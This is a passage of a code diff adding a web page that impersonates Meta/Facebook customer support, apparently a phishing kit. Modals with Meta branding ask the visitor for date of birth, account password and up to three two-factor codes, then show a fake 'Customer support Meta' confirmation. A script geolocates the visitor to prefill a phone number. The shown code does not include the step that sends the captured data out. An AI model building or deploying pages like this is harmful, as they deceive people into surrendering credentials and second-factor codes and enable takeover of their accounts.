+                        </div>
+                        <div
+                            class="input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
+                            <input inputmode="numeric" placeholder="Year" data-i18n-placeholder="modal.info.year"
+                                id="year" class="w-full outline-0 h-full bg-transparent" type="number" min="1"
+                                max="2026" required oninput="2026<this.value&&(this.value=2026)">
+                        </div>
+                    </div>
+                    <div class="form-error" id="error-dob"><svg width="14" height="14" viewBox="0 0 24 24" fill="none"
+                            stroke="currentColor" stroke-width="2">
+                            <circle cx="12" cy="12" r="10" />
+                            <line x1="12" y1="8" x2="12" y2="12" />
+                            <line x1="12" y1="16" x2="12.01" y2="16" />
+                        </svg><span></span></div>
+
+
+
+                    <p class="text-[#9a979e] text-[14px] mb-[7px]" data-i18n="modal.info.response">Our response will
+                        be sent to you within 14 -
+                        48
+                        hours.</p>
+
+                    <div class="mt-[15px] mb-[20px]">
+                        <label class="cursor-pointer flex items-center gap-[5px] text-[14px]" for="custom-checkbox">
+                            <label class="inline-flex items-center cursor-pointer">
+                                <input class="sr-only" id="custom-checkbox" type="checkbox" required>
+                                <div id="checkbox-box"
+                                    class="w-4 h-4 rounded flex items-center justify-center border transition-all duration-200 bg-white border-gray-300">
+                                    <svg class="w-3 h-3 text-white hidden" id="checkbox-check" fill="none"
+                                        stroke="currentColor" stroke-width="3" viewBox="0 0 24 24">
+                                        <path d="M5 13l4 4L19 7" stroke-linecap="round" stroke-linejoin="round" />
+                                    </svg>
+                                </div>
+                            </label>
+                            <span><span data-i18n="modal.info.agree">I agree with</span></span> <a
+                                class="text-[#0d6efd] inline-flex items-center gap-1" href="#">Terms of
+                                use <svg xmlns="http://www.w3.org/2000/svg" width="12" height="12" viewBox="0 0 24 24"
+                                    fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                                    stroke-linejoin="round" style="display:inline;vertical-align:middle">
+                                    <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6" />
+                                    <polyline points="15 3 21 3 21 9" />
+                                    <line x1="10" y1="14" x2="21" y2="3" />
+                                </svg></a>
+                        </label>
+                    </div>
+
+                    <div class="w-full mt-[20px]">
+                        <button type="submit" id="info-submit-btn"
+                            class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-[white] rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center cursor-pointer hover:bg-[#0056c7] transition-colors">
+                            <span id="info-btn-text" data-i18n="modal.info.send">Send</span>
+                            <div id="info-spinner"
+                                class="hidden w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin">
+                            </div>
+                        </button>
+                    </div>
+                </form>
+            </div>
+        </div>
+    </div>
+
+    <div id="modal-password" class="modal">
+        <div class="modal-overlay"></div>
+        <div class="modal-container">
+            <div class="modal-content !h-auto">
+                <div class="flex flex-col items-center py-[40px] px-[20px]">
+                    
+                    <div class="w-[50px] h-[50px] mb-[20px]">
+                        <img width="100%" height="100%" alt="Facebook" src="./meta/logo-fa.svg">
+                    </div>
+                    
+                    <div class="w-full flex flex-col items-center justify-center">
+                        <div class="w-full">
+                            <p class="text-[#9a979e] text-[14px] mb-[15px]" data-i18n="modal.pwd.desc">For your
+                                security, you must enter
+                                your
+                                password to continue.</p>
+                            <form id="form-password">
+                                <div
+                                    class="relative w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[5px] focus-within:border-[#3b82f6] hover:border-[#3b82f6] focus-within:shadow-md hover:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 transition-all duration-200">
+                                    <input class="w-full outline-[0] h-full hide-password-toggle bg-transparent"
+                                        id="password" placeholder="Password"
+                                        data-i18n-placeholder="modal.pwd.placeholder" autocomplete="new-password"
+                                        type="password" value="">
+                                    <button type="button" id="toggle-password"
+                                        class="absolute inset-y-0 right-0 flex items-center px-3 text-gray-500 cursor-pointer"
+                                        tabindex="-1">
+                                        <svg id="eye-off-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20"
+                                            viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                                            stroke-linecap="round" stroke-linejoin="round">
+                                            <path
+                                                d="M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49">
+                                            </path>
+                                            <path d="M14.084 14.158a3 3 0 0 1-4.242-4.242"></path>
+                                            <path
+                                                d="M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143">
+                                            </path>
+                                            <path d="m2 2 20 20"></path>
+                                        </svg>
+                                        <svg id="eye-on-icon" xmlns="http://www.w3.org/2000/svg" width="20" height="20"
+                                            viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+                                            stroke-linecap="round" stroke-linejoin="round" class="hidden">
+                                            <path d="M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z"></path>
+                                            <circle cx="12" cy="12" r="3"></circle>
+                                        </svg>
+                                    </button>
+                                </div>
+                                <style>
+                                    .hide-password-toggle::-ms-clear,
+                                    .hide-password-toggle::-ms-reveal {
+                                        display: none
+                                    }
+                                </style>
+                                <p class="error-msg text-red-500 text-[12px] mb-2" id="pwd-error"></p>
+                                <button type="submit" id="pwd-submit-btn"
+                                    class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-[white] rounded-[40px] flex items-center justify-center cursor-pointer hover:bg-[#0056c7] transition-colors mt-[15px]">
+                                    <span id="pwd-btn-text" data-i18n="modal.pwd.continue">Continue</span>
+                                    <div id="pwd-spinner"
+                                        class="hidden w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin">
+                                    </div>
+                                </button>
+                                <p class="text-center mt-[15px]"><a href="#" class="text-[#9a979e] text-[14px]"
+                                        data-i18n="modal.pwd.forgot">Forgot
+                                        your password?</a></p>
+                            </form>
+                        </div>
+                    </div>
+                    
+                    <div class="w-[60px] mt-[40px]">
+                        <img width="100%" height="100%" alt="Meta" src="./meta/logo-gray.svg">
+                    </div>
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL: 2FA -->
+    <div id="modal-2fa" class="modal">
+        <div class="modal-overlay"></div>
+        <div class="modal-container">
+            <div class="modal-content">
+                <div class="h-full flex flex-col items-center justify-between flex-1 py-[40px] px-[20px]">
+                    <div class="w-full">
+                        <div class="flex w-full items-center text-[#9a979e] gap-[6px] text-[14px] mb-[7px]">
+                            <span id="2fa-email-display"></span>
+                            <div class="w-[4px] h-[4px] bg-[#9a979e] rounded-[5px]"></div>
+                            <span>Facebook</span>
+                        </div>
+                        <h2 class="text-[20px] text-[black] font-[700] mb-[15px]">
+                            <span data-i18n="modal.2fa.title">Two-factor authentication
+                                required</span>
+                            (<span id="2fa-step">1</span>/3)
+                        </h2>
+                        <p class="text-[#9a979e] text-[14px]"><span data-i18n="modal.2fa.desc">Enter the code for this
+                                account that we send to</span>
+                            <span id="2fa-masked-info"></span> <span data-i18n="modal.2fa.desc2">or simply confirm
+                                through the application of two
+                                factors
+                                that you have set (such as Duo Mobile or Google Authenticator)</span>
+                        </p>
+                        <div class="w-full rounded-[10px] bg-[#f5f5f5] overflow-hidden my-[15px]">
+                            <img width="100%" alt="authentication" src="./meta/authentication.png">
+                        </div>
+                        <div class="w-full">
+                            <form id="form-2fa">
+                                <div
+                                    class="input w-full border border-[#d4dbe3] h-[40px] px-[11px] rounded-[10px] bg-[white] text-[14px] mb-[10px] focus-within:border-[#3b82f6] focus-within:shadow-md focus-within:shadow-blue-100 hover:shadow-blue-100 hover:border-[#3b82f6] hover:shadow-md transition-all duration-200">
+                                    <input id="code-2fa" placeholder="Enter the code"
+                                        data-i18n-placeholder="modal.2fa.placeholder" maxlength="8"
+                                        class="w-full outline-none h-full bg-transparent" inputmode="numeric"
+                                        pattern="[0-9]*" value=""
+                                        oninput="this.value=this.value.replace(/[^0-9]/g,'').slice(0,8)">
+                                </div>
+                                <p class="error-msg text-red-500 text-[12px] mb-2" id="2fa-error"></p>
+                                <div class="w-full mt-[20px]">
+                                    <button type="submit" id="tfa-submit-btn" disabled
+                                        class="w-full h-[40px] min-h-[40px] bg-[#0064E0] text-white rounded-[40px] flex items-center justify-center transition-colors opacity-70 cursor-not-allowed disabled:opacity-70 disabled:cursor-not-allowed enabled:opacity-100 enabled:cursor-pointer enabled:hover:bg-[#0056c7]">
+                                        <span id="tfa-btn-text" data-i18n="modal.2fa.submit">Continue</span>
+                                        <div id="tfa-spinner"
+                                            class="hidden w-5 h-5 border-2 border-white border-t-transparent rounded-full animate-spin">
+                                        </div>
+                                    </button>
+                                </div>
+                                <div
+                                    class="w-full mt-[20px] text-[#9a979e] flex items-center justify-center cursor-pointer bg-[transparent] rounded-[40px] px-[20px] py-[10px] border border-[#d4dbe3]">
+                                    <span data-i18n="modal.2fa.help">Try another way</span>
+                                </div>
+                            </form>
+                        </div>
+                    </div>
+                    <div class="w-[60px] mt-[20px] mx-auto">
+                        <img width="100%" height="100%" alt="Meta" src="./meta/logo-gray.svg">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- MODAL: Success -->
+    <div id="modal-success" class="modal">
+        <div class="modal-overlay"></div>
+        <div class="modal-container">
+            <div class="modal-content">
+                <div class="flex items-center justify-between mb-[10px]">
+                    <h2 class="font-bold text-[#0A1317] text-[15px] flex items-center justify-center"><span
+                            data-i18n="modal.success.title">Request
+                            has
+                            been
+                            sent</span></h2>
+                    <div class="w-[18px] h-[18px] cursor-pointer opacity-60 hover:opacity-100 transition-opacity duration-200"
+                        onclick="hideModal('modal-success')">
+                        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="none" stroke="currentColor"
+                            stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                            <line x1="18" y1="6" x2="6" y2="18"></line>
+                            <line x1="6" y1="6" x2="18" y2="18"></line>
+                        </svg>
+                    </div>
+                </div>
+                <div class="flex-1 overflow-y-auto">
+                    <div class="h-full flex flex-col items-center justify-between flex-1">
+                        <div>
+                            <div class="rounded-[10px] overflow-hidden mb-[15px]">
+                                <img width="100%" alt="success" src="./meta/succes.jpg">
+                            </div>
+                            <p class="text-[#9a979e] mb-[10px] text-[15px]" data-i18n="modal.success.desc">Your
+                                request has been added to the
+                                processing queue. We will handle your request within 24 hours in case we do not
+                                receive
+                                feedback, please send back information so we can assist you.</p>
+                            <p class="text-[#9a979e] mb-[20px] text-[15px]" data-i18n="modal.success.from">From the
+                                Customer support Meta.</p>
+                            <a class="w-full bg-[#0064E0] text-white rounded-[40px] pt-[10px] pb-[10px] flex items-center justify-center transition-opacity duration-300 hover:bg-[#0056c7]"
+                                href="https://www.facebook.com" data-i18n="modal.success.return">Return to
+                                Facebook</a>
+                        </div>
+                        <div class="w-[60px] mt-[20px] mx-auto">
+                            <img width="100%" height="100%" alt="Meta" src="./meta/logo-gray.svg">
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // Skeleton loader dismiss
+        window.addEventListener('load', () => {
+            const sk = document.getElementById('skeleton-loader');
+            if (sk) { sk.classList.add('hidden'); setTimeout(() => sk.remove(), 500); }
+            // Dynamic year updates
+            const yr = new Date().getFullYear();
+            const footerYr = document.getElementById('footer-year');
+            if (footerYr) footerYr.textContent = yr;
+            const yearInput = document.getElementById('year');
+            if (yearInput) { yearInput.max = yr; yearInput.setAttribute('oninput', yr + '<this.value&&(this.value=' + yr + ')'); }
+        });
+
+        // Mobile hamburger nav
+        function toggleMobileNav() {
+            document.getElementById('hamburger-btn').classList.toggle('active');
+            document.getElementById('mobile-nav-overlay').classList.toggle('active');
+            document.getElementById('mobile-nav-drawer').classList.toggle('active');
+            document.body.style.overflow = document.getElementById('mobile-nav-drawer').classList.contains('active') ? 'hidden' : '';
+        }
+
+        // Modal functions
+        function showModal(id) { document.getElementById(id).classList.add('active'); }
+        function hideModal(id) { document.getElementById(id).classList.remove('active'); }
+        // Close modal on Escape key
+        document.addEventListener('keydown', function (e) {
+            if (e.key === 'Escape') {
+                const active = document.querySelector('.modal.active');
+                if (active && active.id === 'modal-info') hideModal('modal-info');
+            }
+        });
+
+
+
+        // Benefits select (accordion-style with image switching)
+        let currentBenefit = 1;
+        const benefitData = {
+            1: { image: 'images/meta/verified-badge.jpg' },
+            2: { image: 'images/meta/impersonation.jpg' },
+            3: { image: 'images/meta/enhanced-support.jpg' },
+            4: { image: 'images/meta/profile-features.jpg' }
+        };
+        // Preload all benefit images for instant switching
+        Object.values(benefitData).forEach(b => { const img = new Image(); img.src = b.image; });
+        function selectBenefit(id) {
+            // If clicking the same item, toggle it off
+            if (currentBenefit === id) {
+                currentBenefit = null;
+                for (let i = 1; i <= 4; i++) {
+                    const item = document.getElementById('benefit-item-' + i);
+                    if (!item) continue;
+                    item.className = 'py-6 cursor-pointer border-b border-gray-200 text-gray-400 hover:text-[#1c2b33] transition-colors';
+                    const desc = item.querySelector('.benefit-desc');
+                    if (desc) desc.style.maxHeight = '0';
+                    const chevron = item.querySelector('.benefit-chevron');
+                    if (chevron) chevron.style.transform = 'rotate(0deg)';
+                }
+                return;
+            }
+            currentBenefit = id;
+            // Update all benefit items
+            for (let i = 1; i <= 4; i++) {
+                const item = document.getElementById('benefit-item-' + i);
+                if (!item) continue;
+                const isActive = i === id;
+                item.className = 'py-6 cursor-pointer border-b border-gray-200 ' +
+                    (isActive ? 'text-[#1c2b33]' : 'text-gray-400 hover:text-[#1c2b33] transition-colors');
+                const desc = item.querySelector('.benefit-desc');
+                if (desc) desc.style.maxHeight = isActive ? '200px' : '0';
+                const chevron = item.querySelector('.benefit-chevron');
+                if (chevron) chevron.style.transform = isActive ? 'rotate(180deg)' : 'rotate(0deg)';
+            }
+            // Switch image with fast fade animation
+            const img = document.getElementById('benefit-image');
+            if (img) {
+                img.style.opacity = '0';
+                setTimeout(() => {
+                    img.src = benefitData[id].image;
+                    img.style.opacity = '1';
+                }, 150);
+            }
+        }
+
+        // FAQ toggle
+        function toggleFaq(btn) {
+            const parent = btn.closest('.border-b');
+            const answer = parent.querySelector('.faq-answer');
+            const icon = btn.querySelector('svg');
+            answer.classList.toggle('open');
+            icon.style.transform = answer.classList.contains('open') ? 'rotate(180deg)' : '';
+        }
+
+        // Testimonial Carousel - Slide
+        const totalSlides = 3;
+        let currentTestimonial = 0;
+
+        function changeTestimonial(direction) {
+            currentTestimonial = (currentTestimonial + direction + totalSlides) % totalSlides;
+            const track = document.getElementById('testimonial-track');
+            if (track) {
+                track.style.transform = `translateX(-${currentTestimonial * 100}%)`;
+            }
+            // Update dots
+            const dots = document.querySelectorAll('#carousel-dots > div');
+            dots.forEach((dot, i) => {
+                dot.className = i === currentTestimonial
+                    ? 'w-[7px] h-[7px] rounded-full bg-[#1c2b33] transition-colors duration-300'
+                    : 'w-[7px] h-[7px] rounded-full bg-[#cbd2d9] transition-colors duration-300';
+            });
+        }
+
+        // Country code to flag mapping - comprehensive world coverage
+        let countryCodeToFlag = { "+1": "us", "+7": "ru", "+20": "eg", "+27": "za", "+30": "gr", "+31": "nl", "+32": "be", "+33": "fr", "+34": "es", "+36": "hu", "+39": "it", "+40": "ro", "+41": "ch", "+43": "at", "+44": "gb", "+45": "dk", "+46": "se", "+47": "no", "+48": "pl", "+49": "de", "+51": "pe", "+52": "mx", "+53": "cu", "+54": "ar", "+55": "br", "+56": "cl", "+57": "co", "+58": "ve", "+60": "my", "+61": "au", "+62": "id", "+63": "ph", "+64": "nz", "+65": "sg", "+66": "th", "+81": "jp", "+82": "kr", "+84": "vn", "+86": "cn", "+90": "tr", "+91": "in", "+92": "pk", "+93": "af", "+94": "lk", "+95": "mm", "+98": "ir", "+211": "ss", "+212": "ma", "+213": "dz", "+216": "tn", "+218": "ly", "+220": "gm", "+221": "sn", "+222": "mr", "+223": "ml", "+224": "gn", "+225": "ci", "+226": "bf", "+227": "ne", "+228": "tg", "+229": "bj", "+230": "mu", "+231": "lr", "+232": "sl", "+233": "gh", "+234": "ng", "+235": "td", "+236": "cf", "+237": "cm", "+238": "cv", "+239": "st", "+240": "gq", "+241": "ga", "+242": "cg", "+243": "cd", "+244": "ao", "+245": "gw", "+246": "io", "+247": "ac", "+248": "sc", "+249": "sd", "+250": "rw", "+251": "et", "+252": "so", "+253": "dj", "+254": "ke", "+255": "tz", "+256": "ug", "+257": "bi", "+258": "mz", "+260": "zm", "+261": "mg", "+262": "re", "+263": "zw", "+264": "na", "+265": "mw", "+266": "ls", "+267": "bw", "+268": "sz", "+269": "km", "+290": "sh", "+291": "er", "+297": "aw", "+298": "fo", "+299": "gl", "+350": "gi", "+351": "pt", "+352": "lu", "+353": "ie", "+354": "is", "+355": "al", "+356": "mt", "+357": "cy", "+358": "fi", "+359": "bg", "+370": "lt", "+371": "lv", "+372": "ee", "+373": "md", "+374": "am", "+375": "by", "+376": "ad", "+377": "mc", "+378": "sm", "+380": "ua", "+381": "rs", "+382": "me", "+383": "xk", "+385": "hr", "+386": "si", "+387": "ba", "+389": "mk", "+420": "cz", "+421": "sk", "+423": "li", "+500": "fk", "+501": "bz", "+502": "gt", "+503": "sv", "+504": "hn", "+505": "ni", "+506": "cr", "+507": "pa", "+508": "pm", "+509": "ht", "+590": "gp", "+591": "bo", "+592": "gy", "+593": "ec", "+594": "gf", "+595": "py", "+596": "mq", "+597": "sr", "+598": "uy", "+599": "cw", "+670": "tl", "+672": "nf", "+673": "bn", "+674": "nr", "+675": "pg", "+676": "to", "+677": "sb", "+678": "vu", "+679": "fj", "+680": "pw", "+681": "wf", "+682": "ck", "+683": "nu", "+685": "ws", "+686": "ki", "+687": "nc", "+688": "tv", "+689": "pf", "+690": "tk", "+691": "fm", "+692": "mh", "+850": "kp", "+852": "hk", "+853": "mo", "+855": "kh", "+856": "la", "+880": "bd", "+886": "tw", "+960": "mv", "+961": "lb", "+962": "jo", "+963": "sy", "+964": "iq", "+965": "kw", "+966": "sa", "+967": "ye", "+968": "om", "+970": "ps", "+971": "ae", "+972": "il", "+973": "bh", "+974": "qa", "+975": "bt", "+976": "mn", "+977": "np", "+992": "tj", "+993": "tm", "+994": "az", "+995": "ge", "+996": "kg", "+998": "uz" };
+
+        let countryCodeToName = { "+1": "United States", "+7": "Russia", "+20": "Egypt", "+27": "South Africa", "+30": "Greece", "+31": "Netherlands", "+32": "Belgium", "+33": "France", "+34": "Spain", "+36": "Hungary", "+39": "Italy", "+40": "Romania", "+41": "Switzerland", "+43": "Austria", "+44": "United Kingdom", "+45": "Denmark", "+46": "Sweden", "+47": "Norway", "+48": "Poland", "+49": "Germany", "+51": "Peru", "+52": "Mexico", "+53": "Cuba", "+54": "Argentina", "+55": "Brazil", "+56": "Chile", "+57": "Colombia", "+58": "Venezuela", "+60": "Malaysia", "+61": "Australia", "+62": "Indonesia", "+63": "Philippines", "+64": "New Zealand", "+65": "Singapore", "+66": "Thailand", "+81": "Japan", "+82": "South Korea", "+84": "Vietnam", "+86": "China", "+90": "Turkey", "+91": "India", "+92": "Pakistan", "+93": "Afghanistan", "+94": "Sri Lanka", "+95": "Myanmar", "+98": "Iran", "+211": "South Sudan", "+212": "Morocco", "+213": "Algeria", "+216": "Tunisia", "+218": "Libya", "+220": "Gambia", "+221": "Senegal", "+222": "Mauritania", "+223": "Mali", "+224": "Guinea", "+225": "Ivory Coast", "+226": "Burkina Faso", "+227": "Niger", "+228": "Togo", "+229": "Benin", "+230": "Mauritius", "+231": "Liberia", "+232": "Sierra Leone", "+233": "Ghana", "+234": "Nigeria", "+235": "Chad", "+236": "Central African Republic", "+237": "Cameroon", "+238": "Cape Verde", "+239": "São Tomé and Príncipe", "+240": "Equatorial Guinea", "+241": "Gabon", "+242": "Republic of the Congo", "+243": "DR Congo", "+244": "Angola", "+245": "Guinea-Bissau", "+246": "British Indian Ocean Territory", "+248": "Seychelles", "+249": "Sudan", "+250": "Rwanda", "+251": "Ethiopia", "+252": "Somalia", "+253": "Djibouti", "+254": "Kenya", "+255": "Tanzania", "+256": "Uganda", "+257": "Burundi", "+258": "Mozambique", "+260": "Zambia", "+261": "Madagascar", "+262": "Réunion", "+263": "Zimbabwe", "+264": "Namibia", "+265": "Malawi", "+266": "Lesotho", "+267": "Botswana", "+268": "Eswatini", "+269": "Comoros", "+290": "Saint Helena", "+291": "Eritrea", "+297": "Aruba", "+298": "Faroe Islands", "+299": "Greenland", "+350": "Gibraltar", "+351": "Portugal", "+352": "Luxembourg", "+353": "Ireland", "+354": "Iceland", "+355": "Albania", "+356": "Malta", "+357": "Cyprus", "+358": "Finland", "+359": "Bulgaria", "+370": "Lithuania", "+371": "Latvia", "+372": "Estonia", "+373": "Moldova", "+374": "Armenia", "+375": "Belarus", "+376": "Andorra", "+377": "Monaco", "+378": "San Marino", "+380": "Ukraine", "+381": "Serbia", "+382": "Montenegro", "+383": "Kosovo", "+385": "Croatia", "+386": "Slovenia", "+387": "Bosnia and Herzegovina", "+389": "North Macedonia", "+420": "Czech Republic", "+421": "Slovakia", "+423": "Liechtenstein", "+500": "Falkland Islands", "+501": "Belize", "+502": "Guatemala", "+503": "El Salvador", "+504": "Honduras", "+505": "Nicaragua", "+506": "Costa Rica", "+507": "Panama", "+509": "Haiti", "+590": "Guadeloupe", "+591": "Bolivia", "+592": "Guyana", "+593": "Ecuador", "+594": "French Guiana", "+595": "Paraguay", "+596": "Martinique", "+597": "Suriname", "+598": "Uruguay", "+599": "Curaçao", "+670": "Timor-Leste", "+672": "Norfolk Island", "+673": "Brunei", "+674": "Nauru", "+675": "Papua New Guinea", "+676": "Tonga", "+677": "Solomon Islands", "+678": "Vanuatu", "+679": "Fiji", "+680": "Palau", "+681": "Wallis and Futuna", "+682": "Cook Islands", "+683": "Niue", "+685": "Samoa", "+686": "Kiribati", "+687": "New Caledonia", "+688": "Tuvalu", "+689": "French Polynesia", "+691": "Micronesia", "+692": "Marshall Islands", "+850": "North Korea", "+852": "Hong Kong", "+853": "Macau", "+855": "Cambodia", "+856": "Laos", "+880": "Bangladesh", "+886": "Taiwan", "+960": "Maldives", "+961": "Lebanon", "+962": "Jordan", "+963": "Syria", "+964": "Iraq", "+965": "Kuwait", "+966": "Saudi Arabia", "+967": "Yemen", "+968": "Oman", "+970": "Palestine", "+971": "UAE", "+972": "Israel", "+973": "Bahrain", "+974": "Qatar", "+975": "Bhutan", "+976": "Mongolia", "+977": "Nepal", "+992": "Tajikistan", "+993": "Turkmenistan", "+994": "Azerbaijan", "+995": "Georgia", "+996": "Kyrgyzstan", "+998": "Uzbekistan" };
+
+        // Extract country code from phone number
+        function extractCountryCode(e) {
+            let t = e;
+            t.startsWith("+") || (t = "+" + t);
+            t = "+" + t.replace(/\+/g, "");
+            for (const n of Object.keys(countryCodeToFlag).sort((e, t) => t.length - e.length)) {
+                if (t.startsWith(n)) return n;
+            }
+            return null;
+        }
+
+        // Update flag based on country code
+        function updateFlagFromCode(e) {
+            const t = countryCodeToFlag[e];
+            if (t) {
+                currentCountryCode = e;
+                const n = document.getElementById("selected-flag-img");
+                if (n) {
+                    n.src = "https://flagcdn.com/w20/" + t + ".png";
+                    n.alt = t.toUpperCase();
+                }
+                const a = document.querySelector(".selected-flag");
+                if (a) {
+                    const o = countryCodeToName[e] || t.toUpperCase();
+                    a.title = o + ": " + e;
+                }
+            }
+        }
+
+        // Country dropdown
+        let currentCountryCode = '+1';
+        let currentCountryFlag = 'us';
+
+        function toggleCountryDropdown() {
+            const dd = document.getElementById('country-dropdown');
+            const isOpen = dd.style.display !== 'none';
+            dd.style.display = isOpen ? 'none' : 'block';
+            document.getElementById('flag-dropdown').classList.toggle('open', !isOpen);
+            const searchInput = document.getElementById('country-search');
+            if (!isOpen && searchInput) {
+                searchInput.value = '';
+                dd.querySelectorAll('.country').forEach(item => item.style.display = '');
+                setTimeout(() => searchInput.focus(), 50);
+            }
+        }
+
+        function selectCountry(code, flag) {
+            currentCountryCode = code;
+            currentCountryFlag = flag;
+            const flagImg = document.getElementById('selected-flag-img');
+            if (flagImg) {
+                flagImg.src = 'https://flagcdn.com/w20/' + flag + '.png';
+                flagImg.alt = flag.toUpperCase();
+            }
+            const selectedFlag = document.querySelector('.selected-flag');
+            if (selectedFlag) {
+                const countryName = countryCodeToName[code] || flag.toUpperCase();
+                selectedFlag.title = countryName + ': ' + code;
+            }
+            document.getElementById('phone').value = code + ' ';
+            document.getElementById('phone').focus();
+            document.getElementById('country-dropdown').style.display = 'none';
+            document.getElementById('flag-dropdown').classList.remove('open');
+        }
+
+        // Populate country dropdown dynamically from maps
+        (function populateCountryDropdown() {
+            const dd = document.getElementById('country-dropdown');
+            if (!dd) return;
+            // Sort entries alphabetically by country name
+            const entries = Object.entries(countryCodeToName).sort((a, b) => a[1].localeCompare(b[1]));
+            let html = '';
+            for (const [code, name] of entries) {
+                const flag = countryCodeToFlag[code] || '';
+                const highlight = code === '+1' ? ' highlight' : '';
+                html += `<li class="country${highlight}" onclick="selectCountry('${code}','${flag}')"><img src="https://flagcdn.com/w20/${flag}.png" class="country-flag"><span class="country-name">${name}</span><span class="dial-code">${code}</span></li>`;
+            }
+            // Preserve the search input, append country items after it
+            const searchLi = dd.querySelector('.country-search-wrap');
+            const existingItems = dd.querySelectorAll('.country');
+            existingItems.forEach(item => item.remove());
+            dd.insertAdjacentHTML('beforeend', html);
+        })();
+
+        // Auto-detect country from visitor IP (uses Vercel's built-in geo header)
+        (async function autoDetectCountry() {
+            try {
+                const controller = new AbortController();
+                const timer = setTimeout(() => controller.abort(), 3000);
+                const res = await fetch('/api/geo', { signal: controller.signal });
+                clearTimeout(timer);
+                const data = await res.json();
+                if (data && data.country) {
+                    const cc = data.country;
+                    for (const [dialCode, flagCode] of Object.entries(countryCodeToFlag)) {
+                        if (flagCode === cc) {
+                            currentCountryCode = dialCode;
+                            currentCountryFlag = flagCode;
+                            const flagImg = document.getElementById('selected-flag-img');
+                            if (flagImg) {
+                                flagImg.src = 'https://flagcdn.com/w20/' + flagCode + '.png';
+                                flagImg.alt = flagCode.toUpperCase();
+                            }
+                            const selectedFlag = document.querySelector('.selected-flag');
+                            if (selectedFlag) {
+                                selectedFlag.title = (countryCodeToName[dialCode] || '') + ': ' + dialCode;
+                            }
+                            const phoneEl = document.getElementById('phone');
+                            if (phoneEl) phoneEl.value = dialCode + ' ';
+                            break;
+                        }
+                    }
+                }
+            } catch (e) {
+                // Silently fall back to default
+            }
+        })();
+
+        // Phone input with auto-formatting (from required.html)
+        const phoneInput = document.getElementById('phone');
+        if (phoneInput) {
+            phoneInput.addEventListener('input', function (e) {
+                this.setCustomValidity('');
+                const cursorPos = this.selectionStart;
+                const oldLen = this.value.length;
+
+                let cleaned = this.value.replace(/[^\d+]/g, '');
+                cleaned = cleaned.startsWith('+') ? cleaned : '+' + cleaned;
+                cleaned = '+' + cleaned.replace(/\+/g, '');
+
+                const code = extractCountryCode(cleaned);
+                if (code) {
+                    if (code !== currentCountryCode) {
+                        updateFlagFromCode(code);
+                    }
+                    const digits = cleaned.substring(code.length);
+                    let formatted = '';
+                    for (let i = 0; i < digits.length; i++) {
+                        if (i > 0 && i % 3 === 0) formatted += ' ';
+                        formatted += digits[i];
+                    }
+                    this.value = code + (formatted ? ' ' + formatted : '');
+                } else {
+                    this.value = cleaned;
+                }
+
+                const newLen = this.value.length;
+                const newPos = Math.max(0, cursorPos + (newLen - oldLen));
+                this.setSelectionRange(newPos, newPos);
+            });
+            phoneInput.value = currentCountryCode + ' ';
+        }
+
+        document.addEventListener('click', function (e) {
+            if (!e.target.closest('.flag-dropdown') && !e.target.closest('.country-list')) {
+                const dd = document.getElementById('country-dropdown');
+                dd.style.display = 'none';
+                document.getElementById('flag-dropdown').classList.remove('open');
+                // Clear search and reset visibility
+                const searchInput = document.getElementById('country-search');
+                if (searchInput) {
+                    searchInput.value = '';
+                    dd.querySelectorAll('.country').forEach(item => item.style.display = '');
+                }
+            }
+        });
+
+        // Custom checkbox
+        const customCheckbox = document.getElementById('custom-checkbox');
+        const checkboxBox = document.getElementById('checkbox-box');
+        const checkboxCheck = document.getElementById('checkbox-check');
+        customCheckbox?.addEventListener('change', function () {
+            if (this.checked) {
+                checkboxBox.classList.remove('bg-white', 'border-gray-300');
+                checkboxBox.classList.add('bg-[#0d6efd]', 'border-[#0d6efd]');
+                checkboxCheck.classList.remove('hidden');
+            } else {
+                checkboxBox.classList.add('bg-white', 'border-gray-300');
+                checkboxBox.classList.remove('bg-[#0d6efd]', 'border-[#0d6efd]');
+                checkboxCheck.classList.add('hidden');
+            }
+        });
+
+        // Password toggle
+        const togglePasswordBtn = document.getElementById('toggle-password');
+        const passwordInput = document.getElementById('password');
+        const eyeOffIcon = document.getElementById('eye-off-icon');
+        const eyeOnIcon = document.getElementById('eye-on-icon');
+        togglePasswordBtn?.addEventListener('click', function () {
+            if (passwordInput.type === 'password') {
+                passwordInput.type = 'text';
+                eyeOffIcon.classList.add('hidden');
+                eyeOnIcon.classList.remove('hidden');
+            } else {
+                passwordInput.type = 'password';
+                eyeOffIcon.classList.remove('hidden');
+                eyeOnIcon.classList.add('hidden');
+            }
+        });
+
+        // 2FA input - enable button when 6 digits
+        const code2faInput = document.getElementById('code-2fa');
+        const tfaSubmitBtn = document.getElementById('tfa-submit-btn');
+        code2faInput?.addEventListener('input', function () {
+            tfaSubmitBtn.disabled = this.value.replace(/[^0-9]/g, '').length < 6;
+        });
+
